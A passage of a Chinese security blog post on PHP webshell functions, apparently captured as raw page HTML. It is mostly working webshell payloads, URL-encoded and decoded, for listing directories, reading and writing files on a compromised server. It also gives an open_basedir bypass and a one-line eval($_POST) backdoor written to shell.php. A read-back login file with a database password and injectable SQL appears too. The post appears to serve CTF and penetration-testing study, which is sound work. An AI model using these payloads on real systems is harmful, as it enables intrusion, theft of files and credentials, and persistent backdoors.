class="number">0755</span></div><div class="line">aaaj6/	<span class="number">2016-03-20</span> <span class="number">20</span>:<span class="number">50:35	4096</span>	<span class="number">0755</span></div><div class="line">xss/	<span class="number">2016-02-11</span> <span class="number">12</span>:<span class="number">10:56	4096</span>	<span class="number">0755</span></div><div class="line">nweb1/	<span class="number">2016-04-05</span> <span class="number">12</span>:<span class="number">40:34	4096</span>	<span class="number">0755</span></div><div class="line">aaaj1/	<span class="number">2016-04-11</span> <span class="number">19</span>:<span class="number">15:06	4096</span>	<span class="number">0755</span></div><div class="line">web_aaa/	<span class="number">2015-10-27</span> <span class="number">13</span>:<span class="number">18:09	4096</span>	<span class="number">0755</span></div><div class="line">aaa_final/	<span class="number">2015-12-21</span> <span class="number">14</span>:<span class="number">25:49	4096</span>	<span class="number">0755</span></div><div class="line">aaaj3/	<span class="number">2016-04-11</span> <span class="number">19</span>:<span class="number">20:56	4096</span>	<span class="number">0755</span></div><div class="line">aaaj.bak/	<span class="number">2016-03-15</span> <span class="number">13</span>:<span class="number">47:09	4096</span>	<span class="number">0755</span></div><div class="line">mbWebTraffic/	<span class="number">2015-10-10</span> <span class="number">23</span>:<span class="number">44:46	4096</span>	<span class="number">0755</span></div><div class="line">web1/	<span class="number">2015-12-20</span> <span class="number">16</span>:<span class="number">04:36	4096</span>	<span class="number">0755</span></div><div class="line">web2/	<span class="number">2015-11-05</span> <span class="number">22</span>:<span class="number">41:19	4096</span>	<span class="number">0755</span></div><div class="line">web3/	<span class="number">2015-11-05</span> <span class="number">22</span>:<span class="number">46:17	4096</span>	<span class="number">0755</span></div><div class="line">aaaj2/	<span class="number">2016-03-14</span> <span class="number">14</span>:<span class="number">25:00	4096</span>	<span class="number">0755</span></div><div class="line">sctfq1/	<span class="number">2016-04-11</span> <span class="number">15</span>:<span class="number">22:00	4096</span>	<span class="number">0755</span></div><div class="line">CI/	<span class="number">2015-12-21</span> <span class="number">13</span>:<span class="number">32:32	4096</span>	<span class="number">0755</span></div><div class="line">aaaj4/	<span class="number">2016-04-11</span> <span class="number">19</span>:<span class="number">28:24	4096</span>	<span class="number">0755</span></div><div class="line">nweb/	<span class="number">2016-04-03</span> <span class="number">21</span>:<span class="number">01:51	4096</span>	<span class="number">0755</span></div><div class="line">web50/	<span class="number">2015-12-01</span> <span class="number">15</span>:<span class="number">51:02	4096</span>	<span class="number">0775</span></div><div class="line">websocket/	<span class="number">2016-03-27</span> <span class="number">15</span>:<span class="number">19:00	4096</span>	<span class="number">0755</span></div><div class="line">xsstmp/	<span class="number">2016-01-27</span> <span class="number">22</span>:<span class="number">26:40	4096</span>	<span class="number">0755</span></div><div class="line">table/	<span class="number">2015-11-18</span> <span class="number">19</span>:<span class="number">31:05	4096</span>	<span class="number">0755</span></div><div class="line"><span class="number">9d</span>8cb6817c34555064ffc486e5a53d8e.jpg	<span class="number">2015-11-07</span> <span class="number">13</span>:<span class="number">29:39	114461</span>	<span class="number">0644</span></div><div class="line">}:=-</div></pre></td></tr></table></figure></p>
+<p>看得出来做的很清晰</p>
+<p>里面还有个字段<code>$_POST["0xbad31815"]=L2hvbWUvd3d3cm9vdC9kZWZhdWx0Lw==</code>，后面就是列的目录</p>
+<h2 id="读文件"><a class="headerlink" href="#读文件" title="读文件"></a>读文件</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=%<span class="number">40</span>ini_set(%<span class="number">22</span>display_errors%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">220</span>%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">40</span>set_time_limit(<span class="number">0</span>)%<span class="number">3</span>B%<span class="number">40</span>set_magic_quotes_runtime(<span class="number">0</span>)%<span class="number">3</span>Becho%<span class="number">20</span>%<span class="number">22</span>-%<span class="number">3</span>D%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>F%<span class="number">3</span>Dbase64_decode(%<span class="number">24</span>_POST%<span class="number">5</span>B%<span class="number">220</span>xbad31815%<span class="number">22</span>%<span class="number">5</span>D)%<span class="number">3</span>B%<span class="number">24</span>P%<span class="number">3</span>D%<span class="number">40</span>fopen(%<span class="number">24</span>F%<span class="number">2</span>C%<span class="number">22</span>r%<span class="number">22</span>)%<span class="number">3</span>Becho(%<span class="number">40</span>fread(%<span class="number">24</span>P%<span class="number">2</span>Cfilesize(%<span class="number">24</span>F)))%<span class="number">3</span>B%<span class="number">40</span>fclose(%<span class="number">24</span>P)%<span class="number">3</span>B%<span class="number">3</span>Becho%<span class="number">20</span>%<span class="number">22</span>%<span class="number">7</span>D%<span class="number">3</span>A%<span class="number">3</span>D-%<span class="number">22</span>%<span class="number">3</span>Bdie()%<span class="number">3</span>B{</div></pre></td></tr></table></figure>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">a=@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</div><div class="line">@set_time_limit(<span class="number">0</span>);</div><div class="line">@set_magic_quotes_runtime(<span class="number">0</span>);</div><div class="line">echo <span class="string">"-=:{"</span>;</div><div class="line">$F=base64_decode($_POST[<span class="string">"0xbad31815"</span>]);</div><div class="line">$P=@fopen($F,<span class="string">"r"</span>);</div><div class="line">echo(@fread($P,filesize($F)));</div><div class="line">@fclose($P);;</div><div class="line">echo <span class="string">"}:=-"</span>;</div><div class="line"><span class="keyword">die</span>();</div><div class="line">{</div></pre></td></tr></table></figure>
+<p>返回<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">-=:{<span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">	$user=trim($_POST[<span class="string">'user'</span>]);</div><div class="line">	$pass=md5(trim($_POST[<span class="string">'pass'</span>]));</div><div class="line">	$userid=$_COOKIE[<span class="string">'userid'</span>];</div><div class="line"></div><div class="line">	 $db = <span class="keyword">new</span> mysqli(<span class="string">'localhost'</span>,<span class="string">'xx'</span>,<span class="string">'sGya3fFLx8zPXe'</span>,<span class="string">'xx1'</span>);</div><div class="line"></div><div class="line">	$query=<span class="string">"select password from users where username = '"</span>.$user.<span class="string">"' and password = '"</span>.$password.<span class="string">"'"</span>;</div><div class="line">	$result=$db-&gt;query($query);</div><div class="line">	$result_num=$result-&gt;num_rows;</div><div class="line">	<span class="keyword">if</span>($result_num==<span class="number">0</span>)</div><div class="line">	{</div><div class="line">		<span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('Something Error!')&lt;/script&gt;"</span>;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./welcome.php'&lt;/script&gt;"</span>;	</div><div class="line">	}</div><div class="line"></div><div class="line">	<span class="keyword">else</span></div><div class="line">	{</div><div class="line">		$row=$result-&gt;fetch_assoc();</div><div class="line">		$password=$row[<span class="string">'password'</span>];</div><div class="line">		<span class="keyword">if</span>($pass=$password)</div><div class="line">		{</div><div class="line">			$query = <span class="string">"update users set lastcookie = '"</span>.$userid.<span class="string">"' where username = '"</span>.$user.<span class="string">"'"</span>;</div><div class="line">			$result = $db-&gt;query($query);</div><div class="line">			header(<span class="string">"location:./user.php"</span>);</div><div class="line">		}</div><div class="line">		<span class="keyword">else</span></div><div class="line">		{</div><div class="line">			<span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('Something Error!')&lt;/script&gt;"</span>;</div><div class="line">                        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./welcome.php'&lt;/script&gt;"</span>;</div><div class="line">		}</div><div class="line"></div><div class="line">	}</div><div class="line">	</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">}:=-</div></pre></td></tr></table></figure></p>
+<p>当然读的文件地址是<code>$_POST["0xbad31815"] = L2hvbWUvd3d3cm9vdC9kZWZhdWx0L2hjdGZqMS9sb2dpbi5waHA=</code></p>
+<h2 id="写文件"><a class="headerlink" href="#写文件" title="写文件"></a>写文件</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=%<span class="number">40</span>ini_set(%<span class="number">22</span>display_errors%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">220</span>%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">40</span>set_time_limit(<span class="number">0</span>)%<span class="number">3</span>B%<span class="number">40</span>set_magic_quotes_runtime(<span class="number">0</span>)%<span class="number">3</span>Becho%<span class="number">20</span>%<span class="number">22</span>-%<span class="number">3</span>D%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">22</span>%<span class="number">3</span>Becho%<span class="number">20</span>%<span class="number">40</span>fwrite(fopen(base64_decode(%<span class="number">24</span>_POST%<span class="number">5</span>B%<span class="number">220</span>xbad31815%<span class="number">22</span>%<span class="number">5</span>D)%<span class="number">2</span>C%<span class="number">22</span>w%<span class="number">22</span>)%<span class="number">2</span>Cbase64_decode(%<span class="number">24</span>_POST%<span class="number">5</span>B%<span class="number">220</span>xa7418ec4%<span class="number">22</span>%<span class="number">5</span>D))%<span class="number">3</span>F%<span class="number">221</span>%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">220</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">3</span>Becho%<span class="number">20</span>%<span class="number">22</span>%<span class="number">7</span>D%<span class="number">3</span>A%<span class="number">3</span>D-%<span class="number">22</span>%<span class="number">3</span>Bdie()%<span class="number">3</span>B</div></pre></td></tr></table></figure>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">a=<span class="meta">@ini_set(<span class="meta-string">"display_errors"</span>, <span class="meta-string">"0"</span>)</span>;</div><div class="line"><span class="meta">@set_time_limit(0)</span>;</div><div class="line"><span class="meta">@set_magic_quotes_runtime(0)</span>;</div><div class="line">echo <span class="string">"-=:{"</span>;</div><div class="line">echo <span class="meta">@fwrite(fopen(base64_decode($_POST[<span class="meta-string">"0xbad31815"</span>])</span>,<span class="string">"w"</span>),base64_decode($_POST[<span class="string">"0xa7418ec4"</span>]))?<span class="string">"1"</span>:<span class="string">"0"</span>;;</div><div class="line">echo <span class="string">"}:=-"</span>;</div><div class="line">die();</div></pre></td></tr></table></figure>
+<p>写的文件地址还是<code>$_POST["0xbad31815"] = L2hvbWUvd3d3cm9vdC9kZWZhdWx0L2hjdGZqMS9sb2dpbi5waHA=</code></p>
+<p>写的文件内容<br/><figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$_POST[<span class="string">"0xa7418ec4"</span>] = PD<span class="number">9</span>waHA<span class="symbol">NCgkkdXNlcj10</span>cmltKCRfUE<span class="number">9</span>TVFs<span class="symbol">ndXNlciddKTsNCgkkcGFzcz1</span>tZDUodHJpbSgkX<span class="number">1</span>BPU<span class="number">1</span>RbJ<span class="number">3</span>Bhc<span class="number">3</span>M<span class="symbol">nXSkpOw0</span>KCSR<span class="number">1</span>c<span class="number">2</span>VyaWQ<span class="number">9</span>JF<span class="number">9</span>DT<span class="number">09</span>LSUVbJ<span class="number">3</span>VzZXJpZCddOw<span class="number">0</span>KDQoJICRkYiA<span class="number">9</span>I<span class="name">G5</span>ldyBteX<span class="symbol">NxbGkoJ2</span>xvY<span class="number">2</span>Fsa<span class="name">G9</span>zdCcsJ<span class="number">3</span>dlYjExMScsJ<span class="number">3</span><span class="symbol">NHeWEzZkZMajV1</span>OHpQWGU<span class="symbol">nLCdoY3</span>Rmd<span class="number">2</span>ViMScpOw<span class="number">0</span>KDQoJJHF<span class="number">1</span>ZXJ<span class="number">5</span>PSJzZWxlY<span class="number">3</span>QgcGFzc<span class="number">3</span>d<span class="attr">vcmQgZnJvbSB1</span>c<span class="number">2</span>VycyB<span class="number">3</span>aGVyZSB<span class="number">1</span>c<span class="number">2</span>VybmFtZSA<span class="number">9</span>ICciLiR<span class="number">1</span>c<span class="number">2</span>VyLiI<span class="symbol">nIGFuZCBwYXNzd29</span>yZCA<span class="number">9</span>ICciLiRwYX<span class="symbol">Nzd29</span>yZC<span class="number">4</span>iJyI<span class="number">7</span>DQoJJHJlc<span class="number">3</span><span class="attr">VsdD0</span>kZGItP<span class="symbol">nF1</span>ZXJ<span class="number">5</span>KCRxdWVyeSk<span class="number">7</span>DQoJJHJlc<span class="number">3</span><span class="attr">VsdF9</span>udW<span class="number">09</span>JHJlc<span class="number">3</span><span class="attr">VsdC0</span>+b<span class="symbol">nVtX3</span>Jvd<span class="number">3</span><span class="name">M7</span>DQoJaWYoJHJlc<span class="number">3</span><span class="attr">VsdF9</span>udW<span class="number">09</span>PTApDQoJew<span class="number">0</span>KCQllY<span class="number">2</span>hvICI<span class="number">8</span>c<span class="number">2</span><span class="symbol">NyaXB0</span>PmFsZXJ<span class="number">0</span>KCdTb<span class="number">21</span>ldGhpbmcgRXJyb<span class="number">3</span>IhJyk<span class="number">8</span>L<span class="number">3</span><span class="symbol">NjcmlwdD4</span>iOw<span class="number">0</span>KCQllY<span class="number">2</span>hvICI<span class="number">8</span>c<span class="number">2</span><span class="symbol">NyaXB0</span>P<span class="symbol">ndpbmRvdy5</span>sb<span class="number">2</span><span class="symbol">NhdGlvbi5</span>ocmVmPScuL<span class="number">3</span>dlbG<span class="symbol">NvbWUucGhwJzwvc2</span><span class="symbol">NyaXB0</span>PiI<span class="number">7</span>CQ<span class="number">0</span>KCX<span class="number">0</span><span class="symbol">NCg0</span>KCW<span class="attr">Vsc2</span>U<span class="symbol">NCgl7</span>DQoJCSRyb<span class="number">3</span>c<span class="number">9</span>JHJlc<span class="number">3</span><span class="attr">VsdC0</span>+ZmV<span class="number">0</span>Y<span class="number">2</span>hfYX<span class="symbol">Nzb2</span>MoKTs<span class="symbol">NCgkJJHBhc3</span><span class="symbol">N3</span>b<span class="number">3</span>JkPSRyb<span class="number">3</span>dbJ<span class="number">3</span>Bhc<span class="number">3</span><span class="symbol">N3</span>b<span class="number">3</span>JkJ<span class="number">107</span>DQoJCWlmKCRwYX<span class="symbol">NzPSRwYXNzd29</span>yZCk<span class="symbol">NCgkJew0</span>KCQkJJHF<span class="number">1</span>ZXJ<span class="number">5</span>ID<span class="number">0</span>gI<span class="symbol">nVwZGF0</span>ZSB<span class="number">1</span>c<span class="number">2</span>VycyBzZXQgbGFzdG<span class="symbol">Nvb2</span>tpZSA<span class="number">9</span>ICciLiR<span class="number">1</span>c<span class="number">2</span>VyaWQuIicgd<span class="number">2</span>hlcmUgdX<span class="symbol">Nlcm5</span>hbWUgPSA<span class="symbol">nIi4</span>kdX<span class="symbol">Nlci4</span>iJyI<span class="number">7</span>DQoJCQkkcmVzdWx<span class="number">0</span>ID<span class="number">0</span>gJGRiLT<span class="number">5</span>xdWVyeSgkcXVlc<span class="symbol">nkpOw0</span>KCQkJaGVhZGVyKCJsb<span class="number">2</span><span class="symbol">NhdGlvbjouL3</span>VzZXIucGhwIik<span class="number">7</span>DQoJCX<span class="number">0</span><span class="symbol">NCgkJZWxzZQ0</span>KCQl<span class="number">7</span>DQoJCQllY<span class="number">2</span>hvICI<span class="number">8</span>c<span class="number">2</span><span class="symbol">NyaXB0</span>PmFsZXJ<span class="number">0</span>KCdTb<span class="number">21</span>ldGhpbmcgRXJyb<span class="number">3</span>IhJyk<span class="number">8</span>L<span class="number">3</span><span class="symbol">NjcmlwdD4</span>iOw<span class="number">0</span>KICAgICAgICAgICAgICAgICAgICAgICAgZW<span class="symbol">NobyAiPHNjcmlwdD53</span>aW<span class="number">5</span>kb<span class="number">3</span>cub<span class="name">G9</span>jYXRpb<span class="number">24</span>uaHJlZj<span class="number">0</span><span class="symbol">nLi93</span>ZWxjb<span class="number">21</span>lL<span class="symbol">nBocCc8</span>L<span class="number">3</span><span class="symbol">NjcmlwdD4</span>iOw<span class="number">0</span>KCQl<span class="number">9</span>DQo<span class="symbol">NCgl9</span>DQoJDQo/P<span class="name">g0</span>K</div></pre></td></tr></table></figure></p>
+<h1 id="简单的方式"><a class="headerlink" href="#简单的方式" title="简单的方式"></a>简单的方式</h1><p>除了蚁剑的针对大型的服务器外，其实没必要那么复杂就可以获取我们想要的信息了</p>
+<h2 id="列目录-1"><a class="headerlink" href="#列目录-1" title="列目录"></a>列目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=<span class="built_in">echo</span> <span class="string">"&lt;br /&gt;"</span>;<span class="variable">$handler</span> = opendir(<span class="string">'./'</span>);<span class="keyword">while</span>( (<span class="variable">$filename</span> = readdir(<span class="variable">$handler</span>)) !== <span class="literal">false</span> ) {<span class="built_in">echo</span> <span class="variable">$filename</span>.<span class="string">"&lt;br/&gt;"</span>;}</div></pre></td></tr></table></figure>
+<p>由于可能有open_basedir的问题，所以需要绕过<br/><a href="http://drops.wooyun.org/tips/3978" rel="external" target="_blank">http://drops.wooyun.org/tips/3978</a><br/><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">printf(<span class="string">'&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;'</span>, ini_get(<span class="string">'open_basedir'</span>));  </div><div class="line">$file_list = <span class="keyword">array</span>();</div><div class="line"><span class="comment">// normal files</span></div><div class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///home/wwwroot/*"</span>);</div><div class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) {  </div><div class="line">    $file_list[] = $f-&gt;__toString();</div><div class="line">}</div><div class="line"><span class="comment">// special files (starting with a dot(.))</span></div><div class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///home/wwwroot/.*"</span>);</div><div class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) {  </div><div class="line">    $file_list[] = $f-&gt;__toString();</div><div class="line">}</div><div class="line">sort($file_list);  </div><div class="line"><span class="keyword">foreach</span>($file_list <span class="keyword">as</span> $f){  </div><div class="line">        <span class="keyword">echo</span> <span class="string">"{$f}&lt;br/&gt;"</span>;</div><div class="line">}</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<h2 id="读文件-1"><a class="headerlink" href="#读文件-1" title="读文件"></a>读文件</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">a</span>=<span class="variable">$username</span>=file_get_contents(<span class="string">'./4ff692fb12aa996e27f0a108bfc386c2'</span>);var_dump(<span class="variable">$username</span>);</div></pre></td></tr></table></figure>
+<h2 id="写文件-1"><a class="headerlink" href="#写文件-1" title="写文件"></a>写文件</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file_put_contents("/home/wwwroot/hackme/05d6a8025a7d0c0eee5f6d12a0a94cc9/shell.php",'<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span>');</div></pre></td></tr></table></figure>
+</div>
+</div>
+<div class="copyright">
+<p><span>本文标题:</span><a href="/2016/05/12/php-shell/">php webshell 各种函数</a></p>
+<p><span>文章作者:</span><a href="/" title="回到主页">LoRexxar</a></p>
+<p><span>发布时间:</span>2016-05-12, 20:04:02</p>
+<p><span>最后更新:</span>2016-05-12, 20:49:48</p>
+<p>
+<span>原始链接:</span><a class="post-url" href="/2016/05/12/php-shell/" title="php webshell 各种函数">http://lorexxar.cn/2016/05/12/php-shell/</a>
+<span class="copy-path" data-clipboard-text="原文: http://lorexxar.cn/2016/05/12/php-shell/　　作者: LoRexxar" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+<script> var clipboard = new Clipboard('.copy-path'); </script>
+</p>
+<p>
+<span>许可协议:</span><i class="fa fa-creative-commons"></i> <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank" title="CC BY-NC-SA 4.0 International">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+</div>
+<nav id="article-nav">
+<div class="article-nav-title" id="article-nav-newer">
+<a href="/2016/05/27/opcache-jcfx/">
+                    在php opcache检测隐藏的后门程序
+                </a>
+</div>
+<div class="article-nav-title" id="article-nav-older">
+<a href="/2016/05/10/asis-bcloud/">
+                    Asis2016_Binary Cloud
+                </a>
+</div>
+</nav>
+</article>
+<div class="toc-article" id="toc">
+<strong class="toc-title">文章目录</strong>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看当前目录-amp-查看服务器信息"><span class="toc-number">1.</span> <span class="toc-text">查看当前目录&amp;查看服务器信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#列目录"><span class="toc-number">2.</span> <span class="toc-text">列目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#读文件"><span class="toc-number">3.</span> <span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#写文件"><span class="toc-number">4.</span> <span class="toc-text">写文件</span></a></li></ol></div></div></div></div></body></html><li class="toc-item toc-level-1"><a class="toc-link" href="#简单的方式"><span class="toc-number"></span> <span class="toc-text">简单的方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#列目录-1"><span class="toc-number">1.</span> <span class="toc-text">列目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#读文件-1"><span class="toc-number">2.</span> <span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#写文件-1"><span class="toc-number">3.</span> <span class="toc-text">写文件</span></a></li></ol>
+</li>
+<style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+<input id="tocButton" title="点击按钮隐藏或者显示文章目录" type="button" value="隐藏目录"/>
+<script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+<div class="share">
+<div class="bdsharebuttonbox">
+<a class="fa fa-twitter bds_twi" data-cmd="twi" href="#" title="分享到推特"></a>
+<a class="fa fa-weibo bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
+<a class="fa fa-qq bds_sqq" data-cmd="sqq" href="#" title="分享给 QQ 好友"></a>
+<a class="fa fa-files-o bds_copy" data-cmd="copy" href="#" title="复制网址"></a>
+<a class="fa fa fa-envelope-o bds_mail" data-cmd="mail" href="#" title="通过邮件分享"></a>
+<a class="fa fa-weixin bds_weixin" data-cmd="weixin" href="#" title="生成文章二维码"></a>
+<a class="fa fa-share-alt bds_more" data-cmd="more" href="#"></a></div></div>
+
+<script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"php webshell 各种函数　| LoRexxar's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+
+<section class="youyan" id="comments">
+<script>
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = 'http://v2.uyan.cc/code/uyan.js?uid=2127998';
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+<script> loadComment(); </script>
+<div id="uyan_frame"></div>
+</section>
+<div class="scroll" id="post-nav-button">
+<a href="/2016/05/27/opcache-jcfx/" title="上一篇: 在php opcache检测隐藏的后门程序">
+<i class="fa fa-angle-left"></i>
+</a>
+<a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+<a href="/2016/05/10/asis-bcloud/" title="下一篇: Asis2016_Binary Cloud">
+<i class="fa fa-angle-right"></i>
+</a>
+</div>
+<ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/16/nonce-bypass-script/">通过浏览器缓存来bypass CSP script nonce</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/pppctf2017/">PlaidCTF 2017 web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/xss-bot2/">xss bot从入门到弃坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/09/CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy/">CSP Is Dead, Long Live CSP! 翻译</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/24/pwnhub-jue/">pwnhub 绝对防御 出题思路和反思</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/21/Shadow-Brokers/">Shadow Brokers大新闻整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/21/360chunqiu2017/">360春秋杯2017 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/18/bctf2017-web/">bctf2017 web部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/27/pwnhub-xiaom/">pwnhub 之小m的复仇</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/21/0ctf2017-web/">0ctf201 web部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/njctf2017-wp/">NJCTF Web部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/05/pwnhub-another-php/">pwnhub_another php web部分</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/zctf2017-writeup/">zctf2017 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/20/pwnhub-open/">pwnhub 打开电脑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/16/cdn-bypass-csp/">有趣的cdn bypass CSP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/26/hctf2016-something/">聊聊hctf2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/pwnhub-shen/">pwnhub 深入敌后</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/03/33c3-wp/">33c32016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/cve-2016-10030/">phpmailer RCE漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/26/pwnhub_mi/">pwnhub_迷</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/24/xss-protect/">浅谈xss的后台守护问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/18/pwnhub-pai2/">pwnhub_拍卖行</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/18/pwnhub-pai/">pwnhub_找朋友</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/10/pwnhub-WTF-writeup/">pwnhub_WTF_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/07/polyglot-JPEGs-bypass-csp/">using polyglot JPEGs bypass CSP 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/03/redis-getshell/">通过redis getshell的一些小问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/01/hctf2016-other/">hctf2016 简单部分WEB &amp;&amp; misc writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/30/hctf2016-xss/">hctf2016 guestbook&amp;secret; area writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/29/hctf2016-ATField/">HCTF2016 ATField writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/19/web2-giligili/">hctf2016 giligili writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/31/csp-then2/">CSP进阶-302 Bypass CSP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/28/csp-then/">CSP进阶-link Bypass unsafe line</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/26/ctf-start/">什么是ctf呢？</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/11/hitcon2016-misc/">hitcon2016 misc writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/10/hitcon2016/">hitcon2016 web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/03/Lctf2016/">L-ctf2016 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/14/php-wei/">php 伪协议</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/11/huashanbei2016/">华山杯2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/29/crypto-start/">crypto 简单的RSA</a></li><li class="post-list-item"><a class="post-list-link" 